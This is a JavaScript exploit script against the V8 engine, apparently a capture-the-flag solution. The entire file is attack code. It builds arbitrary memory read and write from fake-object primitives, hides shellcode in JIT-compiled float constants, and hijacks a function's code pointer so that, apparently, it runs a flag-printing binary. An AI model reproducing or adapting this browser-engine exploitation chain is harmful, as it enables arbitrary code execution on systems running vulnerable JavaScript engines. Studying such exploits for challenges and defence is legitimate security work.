let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);
var times = 1;

function f2i(f) {
  fv[0] = f;
  return dv[0];
};

function i2f(i) {
  dv[0] = i;
  return fv[0];
}

function tohex(v) {
  return v.toString(16).padStart(16, "0");
}

function reverseBytes(val) {
  let hex = val.toString(16);
  if (hex.length % 2 !== 0) {
    hex = "0" + hex;
  }
  const bytes = [];
  for (let i = 0; i < hex.length; i += 2) {
    bytes.push(hex.slice(i, i + 2));
  }
  bytes.reverse();
  return BigInt("0x" + bytes.join(""));
}

function clear_upper_i32(val) {
  return val & 0x00000000ffffffffn;
}

function clear_lower_i32(val) {
  return val & 0xffffffff00000000n;
}

let i2fr = (i) => {
  return i2f(reverseBytes(i));
};

vlog = (x) => console.log(tohex(x))


var map_addr = undefined;
var fake_obj_offset = 0x24n;

function ArbRead64(addr) {
  let vuln = [i2f(map_addr), i2f((BigInt(addr) - 0x8n) | 0x0000000800000001n)];
  let vuln_addr = GetAddressOf(vuln);
  fake_obj = GetFakeObject(vuln_addr + fake_obj_offset);
  return f2i(fake_obj[0]);
}

function ArbWrite64(addr, content) {
  let vuln = [i2f(map_addr), i2f((BigInt(addr - 0x8n)) | 0x0000000800000001n)];
  let vuln_addr = GetAddressOf(vuln);
  fake_obj = GetFakeObject(vuln_addr + fake_obj_offset);
  fake_obj[0] = i2f(content);
}

function dbg(x) {
  console.log(`\x1b[01;31m------------DEBUG ${times}------------\x1b[0m`);
  times += 1;
  % DebugPrint(x);
}

function trigger() {
  let code_offset = 0xcn;
  let exe_offset = 0x14n;
  let evil_offset = 0x9cn - 0x40n;

  console.log("JIT Prepared Well")
  // Use JIT convert
  let f = () => {
    return [
      1.930800591290042e-246, 1.9585065576611713e-246, 1.9610806987109561e-246, 1.9711824228871598e-246, 1.987507631927114e-246, 1.9995722277396333e-246, 1.9580100644684157e-246, 1.961638254221047e-246, 1.9710610420991144e-246, 1.9712466673786754e-246, 1.9711826587784113e-246, 1.9322142066340204e-246
    ];
  };

  let shellcode = [
    i2fr(0x48c7c16167000051n), i2fr(0x48b967652f636174n),
    i2fr(0x666c5148b92f6368n), i2fr(0x616c6c656e514831n),
    i2fr(0xf64831d24889e748n), i2fr(0xc7c03b0000000f05n),
  ];

  console.log("Triggering TurboFan")
  // Trigger TurboFan Optimize
  for (let i = 0; i < 1000000; i += 1) {
    f();
  }
  /*
  */
  //%PrepareFunctionForOptimization(f);
  //f();
  //%OptimizeFunctionOnNextCall(f);
  //f();

  addr_f = GetAddressOf(f);
  addr_code = code_offset + addr_f;
  code = clear_upper_i32(ArbRead64(addr_code) - 1n);

  console.log("Use ArbRead")
  addr_asm = ArbRead64(exe_offset + code);
  evil_asm = addr_asm + evil_offset;

  console.log("Code Address:")
  vlog(code);
  console.log("Asm Address:")
  vlog(addr_asm);

  console.log("Use ArbWrite to Trigger")
  ArbWrite64(exe_offset + code, evil_asm);


  // Pwn
  f();
}


// FakeObj -> AAW/AAR -> Turbo fan -> win

//%DebugPrintPtr(addr_code + heap_base);
//%DebugPrint(shellcode);
//%SystemBreak();
